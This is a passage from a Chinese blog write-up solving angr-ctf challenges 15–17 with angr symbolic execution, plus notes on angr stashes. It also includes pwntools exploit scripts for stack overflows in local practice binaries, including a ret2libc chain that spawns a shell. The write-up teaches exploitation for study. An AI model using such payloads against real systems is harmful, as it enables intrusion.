1919810)</span><br></code></pre></td></tr></table></figure><h1 id="0x07-angr-ctf：漏洞利用"><a href="#0x07-angr-ctf：漏洞利用" class="headerlink" title="0x07. angr-ctf：漏洞利用"></a>0x07. angr-ctf：漏洞利用</h1><h2 id="15-angr-arbitrary-read：栈溢出变量覆盖"><a href="#15-angr-arbitrary-read：栈溢出变量覆盖" class="headerlink" title="15_angr_arbitrary_read：栈溢出变量覆盖"></a>15_angr_arbitrary_read：栈溢出变量覆盖</h2><p>惯例拖入 IDA，逻辑比较简单，如果第一个数不是 42698355 或者第一个数是 9507730 就输出 <code>&quot;Try again.&quot;</code> ，否则输出 s 字符串，而在读入到 v4 时存在一个栈溢出可以覆盖 s 指针，因此我们可以让其输出指定地址上的字符串</p><p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" alt="image.png"></p><p>而众所周知 angr-ctf 当中的题目都要我们输出 <code>&quot;Good Job.&quot;</code> 字符串，我们在 IDA 中可以很容易找到他的地址，所以最后的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？一开始笔者也没太想明白，后面想到既然输入的长度是已知的，那么我们可以使用 SimProcedure 来 hook 掉 scanf，将输入作为符号位向量进行求解，同时我们应当为第二个输入字符串中的每个字符添加成可见字符的约束</p><p>那么这里我们可以使用 <code>BVS.chop(bits=n)</code> 来将符号位向量按照一定尺寸进行分割，于是最后的模拟 scanf 写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure><p>接下来我们需要判断我们的符号化向量是否获得了我们预期中的结果，我们这一次将路径探索的终结点放在 <code>puts()</code>，并判断其参数是否为 <code>&quot;Good Job.&quot;</code> 字符串的地址：</p><ul><li>使用 <code>state.memory.load()</code> 将 <code>puts()</code> 的参数提取出来</li><li>使用 <code>state.solver.symbolic()</code> 判断 <code>puts()</code> 的参数是否是我们的 BVS</li><li>使用 <code>state.copy()</code> 获取当前状态的副本，之后在该副本上添加约束以避免影响到原状态</li><li>使用 <code>state.satisfiable()</code> 判断是否满足约束，若是则添加到原状态中求解即可</li></ul><p>方便起见，这里笔者将搜索的地址设为 <code>puts()</code> 函数的 plt 表地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>除了通过复制状态后添加约束并判断的方法以外，我们也可以通过为 <code>state.satisfiable()</code> 指定 <code>extra_constraints</code> 参数的方式来在不影响状态本身已有约束集的状态下进行约束判断，因此上面的 is_success() 函数也可以写成如下形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>将上面的进行整合就是我们最后的 exp 了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可成功输出 <code>&quot;Good Job.&quot;</code>：</p><p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" alt="image.png"></p><h2 id="16-angr-arbitrary-write：栈溢出变量覆盖"><a href="#16-angr-arbitrary-write：栈溢出变量覆盖" class="headerlink" title="16_angr_arbitrary_write：栈溢出变量覆盖"></a>16_angr_arbitrary_write：栈溢出变量覆盖</h2><p>还是惯例地拖入 IDA，本题逻辑主要是读入输入后判断 key 是否是 <code>10225924</code>，若是则拷贝字符串 <code>s</code> 到 <code>dest</code> 所指字符串，否则拷贝到 <code>unimporttant_buffer</code>，最后判断 <code>password_buffer</code> 是否为 <code>&quot;UEQFKBEC&quot;</code>，若是则输出 <code>&quot;Good Job.&quot;</code> 字符串：</p><p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" alt="image.png"></p><p>和上一题类似，本题的输入读入同样存在一个溢出，可以让我们覆盖到 <code>dest</code> ，我们不难想到的是若是将 <code>dest</code> 覆盖为 <code>password_buffer</code> 的地址，便能直接覆写其中的内容</p><p>于是最后的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？这题其实和上一道题本质上是一样的，我们同样可以通过 hook scanf 的方式来将我们的输入符号化，之后在 <code>explore()</code> 中设置一个在 <code>strncpy()</code> 上进行判断的函数——判断其第一个参数是否为 <code>password_buffer</code>、第二个参数是否为 <code>&quot;UEQFKBEC&quot;</code> 即可</p><p>最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" alt="image.png"></p><blockquote><p>笔者感觉这两题基本上一模一样…不知道为啥特地分成两道题-  -</p></blockquote><h2 id="17-angr-arbitrary-jump：栈溢出劫持控制流"><a href="#17-angr-arbitrary-jump：栈溢出劫持控制流" class="headerlink" title="17_angr_arbitrary_jump：栈溢出劫持控制流"></a>17_angr_arbitrary_jump：栈溢出劫持控制流</h2><p>angr-CTF 的最后一道题了，还是惯例拖入 IDA 中，这一次的核心逻辑在 <code>read_input()</code> 当中，而该函数仅为一个简单的 <code>&quot;%s&quot;</code> 溢出：</p><p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" alt="image.png"></p><p>checksec 一下，只开了一个 NX：</p><p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" alt="image.png"></p><p>直接打一套 ret2libc 组合拳：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>运行即可 Get shell：</p><p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" alt="image.png"></p><p>——但在 angr-CTF 中实际上要求我们输出的是 <code>&quot;Good Job.&quot;</code> 字符串：(</p><p>重新再看一下 IDA，我们可以找到一个名为 <code>print_good()</code> 的函数，其会输出 <code>&quot;Good Job.&quot;</code> 字符串</p><p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" alt="image.png"></p><p>那么我们直接将返回地址覆盖为该函数即可，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？首先我们不难想到的是我们还是可以利用 SimProcedure 来 hook scanf 以将输入符号化，由于输入存在溢出，那么我们可以假装不知道输入到栈底的距离，直接将符号化输入设为一个较大长度，若无解再继续增长即可</p><p>但这里我们需要完成的是利用栈溢出来控制程序进行跳转，对于 angr 而言这样的状态是<strong>不受约束的状态</strong>（<strong>unconstrained state</strong>），<strong>会被自动丢弃</strong>，因此我们还需要想办法让 angr 保留这样的状态</p><h3 id="angr-stash"><a href="#angr-stash" class="headerlink" title="angr stash"></a>angr stash</h3><p>在 angr 当中，不同的状态被组织到 simulation manager 的不同的 stash 当中，我们可以按照自己的需求进行步进、过滤、合并、移动等</p><h4 id="①-stash-类型"><a href="#①-stash-类型" class="headerlink" title="① stash 类型"></a>① stash 类型</h4><p>在 angr 当中一共有以下几种 stash：</p><ul><li><code>simgr.active</code>：活跃的状态列表。在未指定替代的情况下会被模拟器默认执行</li><li><code>simgr.deadended</code>：死亡的状态列表。当一个状态无法再被继续执行时（例如没有有效指令、无效的指令指针、不满足其所有的后继（successors））便会被归入该列表</li><li><code>simgr.pruned</code>：被剪枝的状态列表。在指定了 <code>LAZY_SOLVES</code> 时，状态仅在必要时检查可满足性，当一个状态在指定了 <code>LAZY_SOLVES</code> 时被发现是不可满足的（unsat），状态层（state hierarchy）将会被遍历以确认在其历史中最初变为不满足的时间，该点及其所有后代都会被  <em>剪枝</em>  （pruned）并放入该列表</li><li><code>simgr.unconstrained</code>：不受约束的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unconstrained=True</code>，则被认为<strong>不受约束的</strong>（unconstrained，即指令指针被用户数据或其他来源的符号化数据控制）状态会被归入该列表</li><li><code>simgr.unsat</code>：不可满足的状态列表。当创建 <code>SimulationManager</code> 时指定了 